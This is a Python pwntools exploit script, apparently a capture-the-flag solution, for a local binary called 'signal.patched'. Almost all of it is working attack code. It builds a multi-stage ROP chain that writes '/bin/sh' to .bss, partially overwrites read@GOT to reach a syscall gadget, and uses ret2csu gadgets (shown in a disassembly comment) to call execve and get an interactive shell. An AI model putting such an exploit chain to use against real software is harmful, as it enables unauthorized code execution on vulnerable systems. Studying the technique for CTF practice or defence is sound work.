from pwn import *
libc = ELF("libc.so.6", checksec=False)
elf = ELF("signal.patched", checksec=False)
pop_rsi_r15 = p64(0x0000000000400751)
bss = elf.bss(0x100)
'''
sym.__libc_csu_init
│      ┌──> 0x00400730      4c89fa         mov rdx, r15
│      ╎│   0x00400733      4c89f6         mov rsi, r14
│      ╎│   0x00400736      4489ef         mov edi, r13d
│      ╎│   0x00400739      41ff14dc       call qword [r12 + rbx*8]
│      ╎│   0x0040073d      4883c301       add rbx, 1
│      ╎│   0x00400741      4839dd         cmp rbp, rbx
│      └──< 0x00400744      75ea           jne 0x400730
│       │   ; CODE XREF from sym.__libc_csu_init @ 0x400724(x)
│       └─> 0x00400746      4883c408       add rsp, 8
│           0x0040074a      5b             pop rbx
│           0x0040074b      5d             pop rbp
│           0x0040074c      415c           pop r12
│           0x0040074e      415d           pop r13
│           0x00400750      415e           pop r14
│           0x00400752      415f           pop r15
└           0x00400754      c3             ret
'''
def ret2csu(call_func=False, edi=0, rsi=0, rdx=0, new_reg=False):
    payload = b''
    if call_func:
        payload = p64(0x0040074a)
        payload += b''.join([
            p64(0),
            p64(1),
            p64(call_func),
            p64(edi),
            p64(rsi),
            p64(rdx)
        ])
    payload += p64(0x00400730)
    if new_reg:
        payload += b''.join([
            p64(0xdeadbeef),
            p64(0),
            p64(1),
            p64(new_reg['call_func']),
            p64(new_reg['edi']),
            p64(new_reg['rsi']),
            p64(new_reg['rdx'])
        ])
    else:
        payload += b''.join([
            p64(0)*7,
        ])
    return payload

payload = b''.join([
    cyclic(0x110-8),

    # stage 1, insert "/bin/sh\x00"
    pop_rsi_r15, p64(bss), p64(0),
    p64(elf.plt['read']),

    # stage 2, overwrite one byte read@got to point syscall, $rax=1
    # from read() to syscall
    pop_rsi_r15, p64(elf.got['read']), p64(0),
    p64(elf.plt['read']),

    # stage 3, syscall read(1, bss, 0x3b), $rax=0x3b
    ret2csu(elf.got['read'], 1, bss, 0x3b,
    new_reg={
        'call_func': elf.got['read'],
        'edi': bss,
        'rsi': 0,
        'rdx': 0
    }),

    # syscall execve(bss, NULL, NULL)
    ret2csu()

])
p = elf.process()
sleep(1)
p.send(payload) # stage 1 input
sleep(1)
p.send(b"/bin/sh\x00".ljust(0x3b, b'\x00')) # stage 2 input
sleep(1)
p.send(b'\x7f') # stage 3 input
p.recvn(0x3b)
p.interactive()